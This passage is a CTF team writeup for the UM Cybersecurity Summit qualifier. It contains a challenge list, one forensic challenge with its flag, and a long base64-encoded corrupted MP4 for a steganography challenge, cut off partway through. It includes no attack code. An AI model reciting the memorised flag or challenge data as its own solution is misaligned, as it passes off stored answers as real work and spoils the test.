# UM Cybersecurity Summit Qualifier Writeup - Team GPT-1111

Meme writeup: [umctf2025fun-quals.md](umctf2025fun-quals.md)

## Table of Contents
- [**Forensic**](#forensic)
  - [**Hidden in Plain Graphic** - PCAP file extraction and LSB steganography](#hidden-in-plain-graphic)
- [**Steganography**](#steganography)
  - [**Broken** - Repair corrupted MP4 file](#broken)
  - [**Hotline Miami** - Spectrogram and JPG steganography](#hotline-miami)
- [**Web**](#web)
  - [**healthcheck** - Command injection and curl file extraction](#healthcheck)
  - [**Straightforward** - Race condition of DB transaction](#straightforward)
- [**Cryptography**](#cryptography)
  - [**Gist of Samuel** - Morse code and Rail Fence cipher](#gist-of-samuel)
- [**Reverse Engineering**](#reverse-engineering)
  - [**htpp-server** - Reverse ELF to find specific HTTP request path for flag](#htpp-server)
- [**Pwn**](#pwn)
  - [**babysc** - Shellcode writing](#babysc)
  - [**liveleak** - ROP with ret2libc](#liveleak)

## Forensic
### Hidden in Plain Graphic
<details>
  <summary>Description</summary>

Agent Ali, who are secretly a spy from Malaysia has been communicate with others spy from all around the world using secret technique . Intelligence agencies have been monitoring his activities, but so far, no clear evidence of his communications has surfaced. Can you find any suspicious traffic in this file?
    
File: `plain_zight.pcap`
</details>

binwalk (nested file), lsb bit extraction. Detailed solution [here](https://hackmd.io/@tansc/rk9TlEH0yx#Hidden-in-Plain-Graphic).
Flag: `umcs{h1dd3n_1n_png_st3g}`

## Steganography
### Broken
<details>
  <summary>Description</summary>

Can you fix what's broken?
    
> broken.mp4 (base64 encoded):
```
Y3Rme3RoaXMgaXMgbm90IHRoZSBmbGFnfS5oZWhlAAAAAGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAOL1tZGF0AAACrgYF//+q3EXpvebZSLeWLNgg2SPu73gyNjQgLSBjb3JlIDE2NCByMzEwOCAzMWUxOWY5IC0gSC4yNjQvTVBFRy00IEFWQyBjb2RlYyAtIENvcHlsZWZ0IDIwMDMtMjAyMyAtIGh0dHA6Ly93d3cudmlkZW9sYW4ub3JnL3gyNjQuaHRtbCAtIG9wdGlvbnM6IGNhYmFjPTEgcmVmPTMgZGVibG9jaz0xOjA6MCBhbmFseXNlPTB4MzoweDExMyBtZT1oZXggc3VibWU9NyBwc3k9MSBwc3lfcmQ9MS4wMDowLjAwIG1peGVkX3JlZj0xIG1lX3JhbmdlPTE2IGNocm9tYV9tZT0xIHRyZWxsaXM9MSA4eDhkY3Q9MSBjcW09MCBkZWFkem9uZT0yMSwxMSBmYXN0X3Bza2lwPTEgY2hyb21hX3FwX29mZnNldD0tMiB0aHJlYWRzPTYgbG9va2FoZWFkX3RocmVhZHM9MSBzbGljZWRfdGhyZWFkcz0wIG5yPTAgZGVjaW1hdGU9MSBpbnRlcmxhY2VkPTAgYmx1cmF5X2NvbXBhdD0wIGNvbnN0cmFpbmVkX2ludHJhPTAgYmZyYW1lcz0zIGJfcHlyYW1pZD0yIGJfYWRhcHQ9MSBiX2JpYXM9MCBkaXJlY3Q9MSB3ZWlnaHRiPTEgb3Blbl9nb3A9MCB3ZWlnaHRwPTIga2V5aW50PTI1MCBrZXlpbnRfbWluPTI0IHNjZW5lY3V0PTQwIGludHJhX3JlZnJlc2g9MCByY19sb29rYWhlYWQ9NDAgcmM9Y3JmIG1idHJlZT0xIGNyZj0yMy4wIHFjb21wPTAuNjAgcXBtaW49MCBxcG1heD02OSBxcHN0ZXA9NCBpcF9yYXRpbz0xLjQwIGFxPTE6MS4wMACAAAABtmWIhAAv//7bW/MsmMr6pd777hkv1w6svdwqUDRlDO08l6mYAAADAAADAAADAAADAAAMtSfeArxwhv4z4qAAAAMAAAMABcwAAAMBXwAAAwChgAAAWsAAAEoAAAMAO4AAAEIAAAMAWQAAAwCOAAADAL4AAAMBeAAAAwIgAAAEQAAA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